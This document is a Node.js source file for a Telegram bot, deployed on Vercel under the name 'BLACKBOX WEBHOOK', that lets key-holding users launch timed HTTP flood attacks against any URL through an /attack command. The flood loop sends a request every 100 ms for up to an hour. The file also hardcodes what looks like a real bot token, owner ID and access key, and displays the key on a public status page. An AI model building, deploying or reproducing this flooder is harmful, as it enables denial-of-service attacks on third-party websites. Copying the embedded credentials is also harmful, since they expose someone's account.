const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');

const app = express();
app.use(express.json());

// ==== CONFIG ====
const CONFIG = {
  token: '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc',
  owner: 6629230649,
  key: '123RJhTtApALhaT'
};

// ==== INIT BOT ====
const bot = new TelegramBot(CONFIG.token);
const users = new Set([CONFIG.owner]);
const attacks = new Map();

// ==== SIMPLE FLOOD ====
function startFlood(target, seconds, chatId, attackId) {
  let count = 0;
  const start = Date.now();
  const end = start + (seconds * 1000);
  
  const worker = setInterval(() => {
    if (Date.now() > end) {
      clearInterval(worker);
      attacks.delete(attackId);
      
      const duration = (Date.now() - start) / 1000;
      bot.sendMessage(chatId,
        `✅ ATTACK DONE\n` +
        `ID: ${attackId}\n` +
        `Time: ${duration.toFixed(1)}s\n` +
        `Req: ${count}`
      ).catch(() => {});
      
      return;
    }
    
    // Send request
    try {
      const req = https.request(target, () => {
        count++;
      });
      req.on('error', () => {});
      req.setTimeout(2000, () => req.destroy());
      req.end();
    } catch (e) {}
  }, 100);
  
  attacks.set(attackId, { worker, chatId, target });
}

// ==== COMMANDS ====
bot.onText(/\/start/, (msg) => {
  const id = msg.from.id;
  const isOwner = id === CONFIG.owner;
  const isUser = users.has(id);
  
  let text = `⚡ BLACKBOX WEBHOOK\nUser ID: ${id}\n\n`;
  
  if (isOwner) {
    text += `👑 OWNER\n`;
    text += `/attack url seconds\n`;
    text += `/stop id\n`;
    text += `/ping\n`;
    text += `/users\n`;
    text += `/add id\n`;
  } else if (isUser) {
    text += `✅ USER\n`;
    text += `/attack url seconds\n`;
    text += `/stop id\n`;
    text += `/ping\n`;
  } else {
    text += `🔒 Use /key ${CONFIG.key}`;
  }
  
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/ping/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, '🏓 PONG').then(() => {
    const latency = Date.now() - start;
    bot.sendMessage(msg.chat.id, `⏱️ ${latency}ms`);
  });
});

bot.onText(/\/key (.+)/, (msg, match) => {
  const id = msg.from.id;
  
  if (id === CONFIG.owner) {
    bot.sendMessage(msg.chat.id, '👑 Owner no key needed');
    return;
  }
  
  if (match[1] === CONFIG.key) {
    users.add(id);
    bot.sendMessage(msg.chat.id, `✅ Activated! ID: ${id}`);
  } else {
    bot.sendMessage(msg.chat.id, '❌ Wrong key');
  }
});

bot.onText(/\/attack (.+?) (\d+)/, (msg, match) => {
  const id = msg.from.id;
  
  if (!users.has(id) && id !== CONFIG.owner) {
    bot.sendMessage(msg.chat.id, '❌ Not authorized\n/key 123RJhTtApALhaT');
    return;
  }
  
  const url = match[1];
  const seconds = parseInt(match[2]);
  
  if (seconds < 1 || seconds > 3600) {
    bot.sendMessage(msg.chat.id, '❌ 1-3600 seconds only');
    return;
  }
  
  // Validate URL
  if (!url.startsWith('http')) {
    bot.sendMessage(msg.chat.id, '❌ Invalid URL. Use http:// or https://');
    return;
  }
  
  const attackId = Math.random().toString(36).substring(2, 6).toUpperCase();
  
  bot.sendMessage(msg.chat.id,
    `🚀 ATTACK STARTED\n` +
    `ID: ${attackId}\n` +
    `Target: ${url}\n` +
    `Time: ${seconds}s\n\n` +
    `Stop: /stop ${attackId}`
  );
  
  startFlood(url, seconds, msg.chat.id, attackId);
});

bot.onText(/\/stop (.+)/, (msg, match) => {
  const attackId = match[1].toUpperCase();
  const attack = attacks.get(attackId);
  
  if (!attack) {
    bot.sendMessage(msg.chat.id, '❌ Attack not found');
    return;
  }
  
  clearInterval(attack.worker);
  attacks.delete(attackId);
  bot.sendMessage(msg.chat.id, `🛑 Stopped ${attackId}`);
});

bot.onText(/\/users/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const userList = Array.from(users).map(id => `• ${id}`).join('\n');
  bot.sendMessage(msg.chat.id, `👥 USERS (${users.size}):\n${userList}`);
});

bot.onText(/\/add (\d+)/, (msg) => {
  if (msg.from.id !== CONFIG.owner) return;
  
  const newId = parseInt(msg.text.split(' ')[1]);
  users.add(newId);
  bot.sendMessage(msg.chat.id, `✅ Added user ${newId}`);
});

// ==== WEBHOOK ENDPOINT ====
app.post('/webhook', (req, res) => {
  try {
    bot.processUpdate(req.body);
    res.sendStatus(200);
  } catch (error) {
    console.log('Webhook error:', error.message);
    res.sendStatus(200); // Tetap return 200 ke Telegram
  }
});

// ==== WEB INTERFACE ====
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>BLACKBOX WEBHOOK</title>
      <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        h1 { color: #0f0; }
        .status { color: #0f0; font-size: 24px; margin: 20px 0; }
      </style>
    </head>
    <body>
      <h1>⚡ BLACKBOX WEBHOOK</h1>
      <div class="status">STATUS: ACTIVE</div>
      <div>Users: ${users.size}</div>
      <div>Attacks: ${attacks.size}</div>
      <div>Mode: Webhook (Instant)</div>
      <div style="margin-top: 20px; color: #8f8;">
        Endpoint: /webhook<br>
        Owner: ${CONFIG.owner}<br>
        Key: ${CONFIG.key}
      </div>
    </body>
    </html>
  `);
});

// ==== HEALTH CHECK ====
app.get('/health', (req, res) => {
  res.json({
    status: 'active',
    users: users.size,
    attacks: attacks.size,
    uptime: process.uptime()
  });
});

// ==== SETUP WEBHOOK ====
const PORT = process.env.PORT || 3000;

app.listen(PORT, async () => {
  console.log(`🚀 Server started on port ${PORT}`);
  
  // Dapatkan URL Vercel otomatis
  const domain = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://ddgos.vercel.app';
  const webhookUrl = `${domain}/webhook`;
  
  console.log(`🌐 Domain: ${domain}`);
  console.log(`🔗 Webhook URL: ${webhookUrl}`);
  
  try {
    // Set webhook
    await bot.setWebHook(webhookUrl);
    console.log('✅ Webhook set successfully');
    
    // Get bot info
    const me = await bot.getMe();
    console.log(`✅ Bot: @${me.username}`);
    console.log(`✅ Owner: ${CONFIG.owner}`);
    console.log(`✅ Key: ${CONFIG.key}`);
    console.log('✅ Send /ping to test');
    
  } catch (error) {
    console.log('❌ Webhook setup failed:', error.message);
    console.log('⚠️  Bot will still work if you manually set webhook');
    console.log(`⚠️  Manual setup: curl -X POST https://api.telegram.org/bot${CONFIG.token}/setWebhook?url=${webhookUrl}`);
  }
});

// Keep alive untuk Vercel
setInterval(() => {
  https.get('https://ddgos.vercel.app/health', () => {}).on('error', () => {});
}, 30000); // Ping setiap 30 detik
